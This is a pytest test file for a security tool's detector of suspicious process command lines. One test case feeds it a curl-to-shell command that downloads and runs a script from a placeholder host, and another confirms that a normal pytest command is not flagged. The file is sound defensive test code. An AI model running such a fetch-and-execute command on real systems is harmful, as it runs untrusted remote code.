from dvinesoul_security.core.processes import ProcessInfo
from dvinesoul_security.security.detections.command_lines import (
    detect_suspicious_command_lines,
)


def test_detects_curl_pipe_shell_command():
    processes = [
        ProcessInfo(
            pid=1234,
            name="sh",
            state="S",
            user="dvines",
            memory_kb=1024,
            executable="/usr/bin/sh",
            command="curl https://example.invalid/script.sh | sh",
        )
    ]

    findings = detect_suspicious_command_lines(processes)

    assert len(findings) == 1
    assert findings[0].category == "process"
    assert findings[0].severity == "high"
    assert findings[0].is_observation is False


def test_normal_command_is_not_flagged():
    processes = [
        ProcessInfo(
            pid=1234,
            name="python",
            state="S",
            user="dvines",
            memory_kb=1024,
            executable="/usr/bin/python3",
            command="python3 -m pytest -q",
        )
    ]

    findings = detect_suspicious_command_lines(processes)

    assert findings == []
